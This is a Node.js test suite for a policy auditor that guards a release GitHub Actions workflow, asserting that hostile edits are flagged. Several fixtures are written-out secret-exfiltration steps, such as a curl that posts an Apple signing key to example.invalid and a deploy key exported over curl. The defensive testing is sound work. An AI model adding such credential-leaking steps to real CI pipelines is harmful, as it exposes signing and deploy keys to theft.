import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { fileURLToPath } from "node:url";
import test from "node:test";

import fc from "fast-check";
import { parse, stringify } from "yaml";

import {
  WorkflowPolicyError,
  auditPolicyWorkflow,
  auditWorkflowPolicy,
} from "./workflow-policy.mjs";

const workflowPath = new URL("../.github/workflows/release.yml", import.meta.url);
const canonicalSource = await readFile(workflowPath, "utf8");
const policyWorkflowPath = new URL(
  "../.github/workflows/policy.yml",
  import.meta.url,
);
const canonicalPolicySource = await readFile(policyWorkflowPath, "utf8");
const policyCli = fileURLToPath(
  new URL("./workflow-policy.mjs", import.meta.url),
);

function mutateWorkflow(mutator) {
  const workflow = parse(canonicalSource);
  mutator(workflow);
  return stringify(workflow);
}

function diagnosticCodes(source) {
  return auditWorkflowPolicy(source).map(({ code }) => code);
}

function diagnosticIdentities(source) {
  return auditWorkflowPolicy(source).map(
    ({ code, job, step }) => `${code}:${job}:${step ?? "job"}`,
  );
}

function mutatePolicyWorkflow(mutator) {
  const workflow = parse(canonicalPolicySource);
  mutator(workflow);
  return stringify(workflow);
}

test("the current release workflow satisfies the protected contract", () => {
  assert.deepEqual(auditWorkflowPolicy(canonicalSource), []);
});

test("the policy rejects malformed and empty workflow input", () => {
  for (const [source, message] of [
    ["", "workflow source must be non-empty text"],
    [" \n\t", "workflow source must be non-empty text"],
    ["jobs: [", "workflow source must be valid YAML"],
    ["- job", "workflow root must be a mapping"],
    ["null", "workflow root must be a mapping"],
    ["42", "workflow root must be a mapping"],
  ]) {
    assert.throws(
      () => auditWorkflowPolicy(source),
      (error) => error instanceof WorkflowPolicyError &&
        error.name === "WorkflowPolicyError" && error.message === message,
    );
  }
  for (const source of [null, false, 42, [], {}]) {
    assert.throws(
      () => auditWorkflowPolicy(source),
      (error) => error instanceof WorkflowPolicyError &&
        error.message === "workflow source must be non-empty text",
    );
  }
});

test("the parser rejects aliases, duplicate keys, and invalid job containers", () => {
  assert.throws(
    () => auditWorkflowPolicy(
      "shared: &shared { runs-on: ubuntu }\njobs: { one: *shared }\n",
    ),
    /Alias resolution is disabled/,
  );
  assert.throws(
    () => auditWorkflowPolicy("jobs: {}\njobs: {}\n"),
    (error) => error instanceof WorkflowPolicyError &&
      error.message === "workflow source must be valid YAML",
  );
  for (const [source, message] of [
    ["on: {}\njobs: null\n", "workflow jobs must be a mapping"],
    ["on: {}\njobs: invalid\n", "workflow jobs must be a mapping"],
    ["on: {}\njobs: []\n", "workflow jobs must be a mapping"],
    [mutateWorkflow((workflow) => {
      workflow.jobs.validate = null;
    }), "validate job must be a mapping"],
    [mutateWorkflow((workflow) => {
      workflow.jobs.validate.needs = ["build-macos", 7];
    }), "job needs must be a string or string array"],
    [mutateWorkflow((workflow) => {
      workflow.jobs.validate.steps = [false];
    }), "validate step 1 must be a mapping"],
  ]) {
    assert.throws(
      () => auditWorkflowPolicy(source),
      (error) => error instanceof WorkflowPolicyError && error.message === message,
    );
  }
});

test("the workflow cannot widen permissions or add reusable secret jobs", () => {
  const widened = mutateWorkflow((workflow) => {
    workflow.permissions = { contents: "write" };
    workflow.jobs.hidden_export = {
      uses: "Epoch-ML/unsafe/.github/workflows/export.yml@main",
      secrets: "inherit",
      permissions: { contents: "write" },
    };
  });
  const codes = diagnosticCodes(widened);
  assert.ok(codes.includes("permission-boundary"));
  assert.ok(codes.includes("job-contract"));
});

test("secret expressions are canonical and bound to one exact consuming step", () => {
  const escaped = mutateWorkflow((workflow) => {
    workflow.jobs["apple-sign"].steps.push({
      name: "Export Apple key",
      env: {
        KEY: "${{ secrets['ZERGCHAT_APPLE_API_PRIVATE_KEY'] }}",
      },
      run: "curl --data-binary \"$KEY\" https://example.invalid",
    });
  });
  const codes = diagnosticCodes(escaped);
  assert.ok(codes.includes("secret-expression-boundary"));
  assert.ok(codes.includes("apple-credential-contract"));
});

test("every secret context form is rejected without prose false positives", () => {
  for (const expression of [
    "${{ secrets['ZERGCHAT_APPLE_API_KEY_ID'] }}",
    "${{ secrets [ 'ZERGCHAT_APPLE_API_KEY_ID' ] }}",
    "${{ SeCrEtS.ZERGCHAT_APPLE_API_KEY_ID }}",
    "${{ secrets[format('{0}', 'KEY')] }}",
    "${{ toJSON(secrets) }}",
    "prefix-${{\n secrets.ZERGCHAT_APPLE_API_KEY_ID\n}}-suffix",
    "${{ 'quoted }} delimiter' || secrets.ZERGCHAT_APPLE_API_KEY_ID }}",
    "${{ 'safe' }}-${{ true && secrets.ZERGCHAT_APPLE_API_KEY_ID }}",
  ]) {
    const hostile = mutateWorkflow((workflow) => {
      workflow.jobs.validate.steps[0].with = {
        nested: [{ token: expression }],
      };
    });
    const codes = diagnosticCodes(hostile);
    assert.ok(
      codes.includes("secret-expression-boundary") ||
        codes.includes("secret-outside-step-env"),
      expression,
    );
  }

  for (const value of [
    "secrets.DEPLOY_KEY is documentation, not an expression",
    "${{ 'secrets' }}",
    "${{ mysecrets.DEPLOY_KEY }}",
    "${{ _secrets.DEPLOY_KEY }}",
    "${{ secrets2.DEPLOY_KEY }}",
    "${{ 'don''t expose secrets or }} here' }}",
    "${{ secrets.DEPLOY_KEY }",
    "https://example.invalid/secrets.DEPLOY_KEY",
  ]) {
    const equivalent = mutateWorkflow((workflow) => {
      workflow.jobs.validate.steps[0].name = value;
    });
    assert.deepEqual(auditWorkflowPolicy(equivalent), [], value);
  }
});

test("non-canonical source, Apple, updater, and feed access reports its boundary", () => {
  for (const [jobName, secretName, expectedCode] of [
    ["build-macos", "ZERG_SOURCE_DEPLOY_KEY", "source-credential-contract"],
    ["apple-sign", "ZERGCHAT_APPLE_API_KEY_ID", "apple-credential-contract"],
    ["sign-updater-preview", "ZERGCHAT_PREVIEW_TAURI_SIGNING_PRIVATE_KEY",
      "updater-credential-contract"],
    ["promote-feed", "ZERGCHAT_FEED_DEPLOY_KEY", "feed-credential-contract"],
  ]) {
    const hostile = mutateWorkflow((workflow) => {
      workflow.jobs[jobName].steps.push({
        name: `Non-canonical ${jobName}`,
        env: { KEY: `\${{ secrets['${secretName}'] }}` },
        run: "printf '%s' \"$KEY\" >/dev/null",
      });
    });
    const codes = diagnosticCodes(hostile);
    assert.ok(codes.includes("secret-expression-boundary"), jobName);
    assert.ok(codes.includes(expectedCode), jobName);
  }
});

test("canonical secrets cannot move, duplicate, or appear outside step env", () => {
  const source = mutateWorkflow((workflow) => {
    const checkout = workflow.jobs["build-macos"].steps.find(
      ({ name }) => name === "Check out the exact SHA and matching source tag",
    );
    checkout.run += "\necho '${{ secrets.ZERG_SOURCE_DEPLOY_KEY }}'";
    workflow.jobs.validate.steps.push({
      name: "Relocated source key",
      env: { SOURCE_DEPLOY_KEY: "${{ secrets.ZERG_SOURCE_DEPLOY_KEY }}" },
      run: "true",
    });
  });
  const identities = diagnosticIdentities(source);
  assert.ok(identities.includes(
    "secret-outside-step-env:build-macos:" +
      "Check out the exact SHA and matching source tag",
  ));
  assert.ok(identities.includes("source-credential-contract:workflow:job"));
});

test("source, Apple, updater, and feed credentials stay inside bounded windows", () => {
  const unsafe = mutateWorkflow((workflow) => {
    const sourceStep = workflow.jobs["build-macos"].steps.find(
      ({ name }) => name === "Check out the exact SHA and matching source tag",
    );
    sourceStep.run = sourceStep.run.replace(
      "unset SOURCE_DEPLOY_KEY GITHUB_META_TOKEN",
      "git -C source checkout --detach \"$SOURCE_SHA\"\n" +
        "unset SOURCE_DEPLOY_KEY GITHUB_META_TOKEN",
    );
    const appleStep = workflow.jobs["apple-sign"].steps.find(
      ({ name }) => name === "Apply preview ad-hoc or fail-closed stable Apple signing",
    );
    appleStep.run += "\nnode scripts/package-macos.mjs";
    const updaterStep = workflow.jobs["sign-updater-stable"].steps.find(
      ({ name }) => name === "Sign only the stable updater archive",
    );
    updaterStep.run = updaterStep.run.replace(
      "unset TAURI_SIGNING_PRIVATE_KEY TAURI_SIGNING_PRIVATE_KEY_PASSWORD",
      "curl https://example.invalid\n" +
        "unset TAURI_SIGNING_PRIVATE_KEY TAURI_SIGNING_PRIVATE_KEY_PASSWORD",
    );
    const feedStep = workflow.jobs["promote-feed"].steps.find(
      ({ name }) => name === "Push the prepared release-data commit",
    );
    feedStep.run = feedStep.run.replace(
      "HEAD:refs/heads/release-data",
      "HEAD:refs/heads/main",
    );
  });
  const codes = diagnosticCodes(unsafe);
  assert.ok(codes.includes("source-credential-window"));
  assert.ok(codes.includes("apple-secret-window"));
  assert.ok(codes.includes("updater-secret-window"));
  assert.ok(codes.includes("feed-credential-contract"));
});

test("every credential window rejects arbitrary program drift", () => {
  for (const [jobName, stepName, expectedCode] of [
    ["build-macos", "Check out the exact SHA and matching source tag",
      "source-credential-window"],
    ["apple-sign", "Apply preview ad-hoc or fail-closed stable Apple signing",
      "apple-secret-window"],
    ["sign-updater-preview", "Sign only the preview updater archive",
      "updater-secret-window"],
    ["sign-updater-stable", "Sign only the stable updater archive",
      "updater-secret-window"],
    ["promote-feed", "Push the prepared release-data commit",
      "feed-credential-contract"],
  ]) {
    const hostile = mutateWorkflow((workflow) => {
      const step = workflow.jobs[jobName].steps.find(
        ({ name }) => name === stepName,
      );
      step.run += "\npython3 -c 'print(\"credential window escape\")'";
    });
    assert.ok(
      diagnosticCodes(hostile).includes(expectedCode),
      `${jobName}/${stepName}`,
    );
  }
});

test("actions, runners, environments, and dependency edges are exact", () => {
  const drifted = mutateWorkflow((workflow) => {
    workflow.jobs["signed-smoke"]["runs-on"] = "ubuntu-latest";
    workflow.jobs["signed-smoke"].environment = "zergchat-apple-stable";
    workflow.jobs["signed-smoke"].needs = ["apple-sign"];
    workflow.jobs["signed-smoke"].steps[0].uses = "actions/checkout@main";
  });
  const codes = diagnosticCodes(drifted);
  assert.ok(codes.includes("job-contract"));
  assert.ok(codes.includes("environment-boundary"));
  assert.ok(codes.includes("action-contract"));
});

test("every job preserves its exact runner, permissions, environment, and program", () => {
  const workflow = parse(canonicalSource);
  for (const jobName of Object.keys(workflow.jobs)) {
    for (const mutate of [
      (job) => {
        job["runs-on"] = job["runs-on"] === "ubuntu-latest"
          ? "macos-14"
          : "ubuntu-latest";
      },
      (job) => {
        job.permissions = job.permissions?.contents === "write"
          ? { contents: "read" }
          : { contents: "write" };
      },
      (job) => { job.environment = "unapproved"; },
      (job) => { job.needs = ["validate", "unapproved"]; },
      (job) => { job.steps.push({ name: "Injected", run: "echo injected" }); },
    ]) {
      const hostile = mutateWorkflow((candidate) => {
        mutate(candidate.jobs[jobName]);
      });
      assert.ok(diagnosticCodes(hostile).includes("job-contract"), jobName);
    }
    const runIndex = workflow.jobs[jobName].steps.findIndex(
      ({ run }) => typeof run === "string",
    );
    if (runIndex !== -1) {
      const hostile = mutateWorkflow((candidate) => {
        candidate.jobs[jobName].steps[runIndex].run += "\necho injected";
      });
      assert.ok(diagnosticCodes(hostile).includes("job-contract"), jobName);
    }
  }
});

test("dispatch, workflow permissions, and action inputs are exact", () => {
  for (const hostile of [
    mutateWorkflow((workflow) => { delete workflow.on; }),
    mutateWorkflow((workflow) => { workflow.on.push = {}; }),
    mutateWorkflow((workflow) => {
      workflow.on.workflow_dispatch.inputs.extra = { required: false };
    }),
  ]) {
    assert.ok(diagnosticCodes(hostile).includes("trigger-contract"));
  }
  const actionDrift = mutateWorkflow((workflow) => {
    const action = workflow.jobs.validate.steps.find(
      ({ uses }) => typeof uses === "string",
    );
    action.uses = "actions/checkout@main";
    action.with = { "persist-credentials": true };
  });
  assert.ok(diagnosticCodes(actionDrift).includes("action-contract"));
});

test("every additional job name is rejected", () => {
  // Property: extending the exact job set by any distinct safe identifier is rejected.
  fc.assert(fc.property(
    fc.stringMatching(/^[a-z][a-z0-9_-]{0,20}$/).filter((name) =>
      !["validate", "build-macos", "apple-sign", "signed-smoke",
        "sign-updater-preview", "sign-updater-stable", "sign-updater",
        "publish", "promote-feed", "deploy-pages"].includes(name)
    ),
    (name) => {
      const extended = mutateWorkflow((workflow) => {
        workflow.jobs[name] = {
          "runs-on": "ubuntu-24.04",
          steps: [{ run: "true" }],
        };
      });
      assert.ok(diagnosticCodes(extended).includes("job-contract"));
    },
  ), { numRuns: 50 });
});

test("the policy workflow is exact and secret-free", () => {
  assert.deepEqual(auditPolicyWorkflow(canonicalPolicySource), []);
  for (const hostile of [
    mutatePolicyWorkflow((workflow) => {
      workflow.permissions = { contents: "write" };
    }),
    mutatePolicyWorkflow((workflow) => {
      workflow.jobs.policy.steps.push({
        name: "Token export",
        env: { TOKEN: "${{ secrets.ZERGCHAT_FEED_DEPLOY_KEY }}" },
        run: "curl https://example.invalid",
      });
    }),
    mutatePolicyWorkflow((workflow) => {
      workflow.jobs.policy.steps[0].uses = "actions/checkout@main";
    }),
  ]) {
    assert.deepEqual(auditPolicyWorkflow(hostile).map(({ code }) => code), [
      "policy-ci-contract",
    ]);
  }
});

test("the CLI selects release and policy gates and exposes their exit status", async () => {
  const releaseResult = spawnSync(
    process.execPath,
    [policyCli, fileURLToPath(workflowPath)],
    { encoding: "utf8" },
  );
  assert.equal(releaseResult.status, 0, releaseResult.stderr);
  assert.deepEqual(JSON.parse(releaseResult.stdout), { diagnostics: [] });

  const policyResult = spawnSync(
    process.execPath,
    [policyCli, fileURLToPath(policyWorkflowPath), "--policy-ci"],
    { encoding: "utf8" },
  );
  assert.equal(policyResult.status, 0, policyResult.stderr);
  assert.deepEqual(JSON.parse(policyResult.stdout), { diagnostics: [] });

  const temp = await mkdtemp(`${tmpdir()}/zergchat-policy-cli-`);
  try {
    const hostilePath = `${temp}/hostile.yml`;
    await writeFile(hostilePath, "jobs: {}\n", { flag: "wx", mode: 0o600 });
    const hostile = spawnSync(process.execPath, [policyCli, hostilePath], {
      encoding: "utf8",
    });
    assert.equal(hostile.status, 1);
    assert.ok(JSON.parse(hostile.stdout).diagnostics.length >= 1);

    const malformedPath = `${temp}/malformed.yml`;
    await writeFile(malformedPath, "jobs: [\n", { flag: "wx", mode: 0o600 });
    const malformed = spawnSync(process.execPath, [policyCli, malformedPath], {
      encoding: "utf8",
    });
    assert.equal(malformed.status, 1);
    assert.match(malformed.stderr, /workflow source must be valid YAML/);
  } finally {
    await rm(temp, { recursive: true, force: true });
  }

  const usage = spawnSync(process.execPath, [policyCli], { encoding: "utf8" });
  assert.equal(usage.status, 1);
  assert.match(usage.stderr, /usage: workflow-policy\.mjs/);
});
